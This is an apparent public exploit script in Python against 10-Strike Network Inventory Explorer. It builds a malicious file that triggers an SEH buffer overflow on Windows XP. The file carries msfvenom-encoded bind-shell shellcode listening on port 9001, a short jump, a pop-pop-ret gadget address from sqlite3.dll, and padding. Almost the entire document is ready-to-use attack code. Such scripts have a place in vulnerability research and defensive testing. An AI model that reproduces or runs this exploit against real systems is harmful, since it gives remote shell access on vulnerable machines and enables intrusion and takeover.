# Exploit for 10-Strike Network Inventory Explorer - SEH
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.txt", "wb")

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x5c\x3a" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xdb\xc7\xba\x4a\xd6\x92\xd5\xd9\x74\x24"
shellcode_bind += b"\xf4\x58\x31\xc9\xb1\x53\x31\x50\x17\x03"
shellcode_bind += b"\x50\x17\x83\xa2\x2a\x70\x20\xce\x3b\xf7"
shellcode_bind += b"\xcb\x2e\xbc\x98\x42\xcb\x8d\x98\x31\x98"
shellcode_bind += b"\xbe\x28\x31\xcc\x32\xc2\x17\xe4\xc1\xa6"
shellcode_bind += b"\xbf\x0b\x61\x0c\xe6\x22\x72\x3d\xda\x25"
shellcode_bind += b"\xf0\x3c\x0f\x85\xc9\x8e\x42\xc4\x0e\xf2"
shellcode_bind += b"\xaf\x94\xc7\x78\x1d\x08\x63\x34\x9e\xa3"
shellcode_bind += b"\x3f\xd8\xa6\x50\xf7\xdb\x87\xc7\x83\x85"
shellcode_bind += b"\x07\xe6\x40\xbe\x01\xf0\x85\xfb\xd8\x8b"
shellcode_bind += b"\x7e\x77\xdb\x5d\x4f\x78\x70\xa0\x7f\x8b"
shellcode_bind += b"\x88\xe5\xb8\x74\xff\x1f\xbb\x09\xf8\xe4"
shellcode_bind += b"\xc1\xd5\x8d\xfe\x62\x9d\x36\xda\x93\x72"
shellcode_bind += b"\xa0\xa9\x98\x3f\xa6\xf5\xbc\xbe\x6b\x8e"
shellcode_bind += b"\xb9\x4b\x8a\x40\x48\x0f\xa9\x44\x10\xcb"
shellcode_bind += b"\xd0\xdd\xfc\xba\xed\x3d\x5f\x62\x48\x36"
shellcode_bind += b"\x72\x77\xe1\x15\x1b\xb4\xc8\xa5\xdb\xd2"
shellcode_bind += b"\x5b\xd6\xe9\x7d\xf0\x70\x42\xf5\xde\x87"
shellcode_bind += b"\xa5\x2c\xa6\x17\x58\xcf\xd7\x3e\x9f\x9b"
shellcode_bind += b"\x87\x28\x36\xa4\x43\xa8\xb7\x71\xf9\xa0"
shellcode_bind += b"\x1e\x2a\x1c\x4d\xe0\x9a\xa0\xfd\x89\xf0"
shellcode_bind += b"\x2e\x22\xa9\xfa\xe4\x4b\x42\x07\x07\x50"
shellcode_bind += b"\xba\x8e\xe1\xfc\xac\xc6\xba\x68\x0f\x3d"
shellcode_bind += b"\x73\x0f\x70\x17\x2b\xa7\x39\x71\xec\xc8"
shellcode_bind += b"\xb9\x57\x5a\x5e\x32\xb4\x5e\x7f\x45\x91"
shellcode_bind += b"\xf6\xe8\xd2\x6f\x97\x5b\x42\x6f\xb2\x0b"
shellcode_bind += b"\xe7\xe2\x59\xcb\x6e\x1f\xf6\x9c\x27\xd1"
shellcode_bind += b"\x0f\x48\xda\x48\xa6\x6e\x27\x0c\x81\x2a"
shellcode_bind += b"\xfc\xed\x0c\xb3\x71\x49\x2b\xa3\x4f\x52"
shellcode_bind += b"\x77\x97\x1f\x05\x21\x41\xe6\xff\x83\x3b"
shellcode_bind += b"\xb0\xac\x4d\xab\x45\x9f\x4d\xad\x49\xca"
shellcode_bind += b"\x3b\x51\xfb\xa3\x7d\x6e\x34\x24\x8a\x17"
shellcode_bind += b"\x28\xd4\x75\xc2\xe8\xf4\x97\xc6\x04\x9d"
shellcode_bind += b"\x01\x83\xa4\xc0\xb1\x7e\xea\xfc\x31\x8a"
shellcode_bind += b"\x93\xfa\x2a\xff\x96\x47\xed\xec\xea\xd8"
shellcode_bind += b"\x98\x12\x58\xd8\x88"

junk = "A" * 186
nseh = "\xeb\x14\x90\x90"
seh  = "\x7a\x49\xe8\x61"        # 0x61e8497a : pop esi # pop edi # ret sqlite3.dll
nops = "\x90" * 30
junk2 = "D" * (5000-len(junk+nseh+seh+shellcode_bind+nops))

buffer = junk + nseh + seh + nops + shellcode_bind + junk2

file.write(buffer)
file.close()
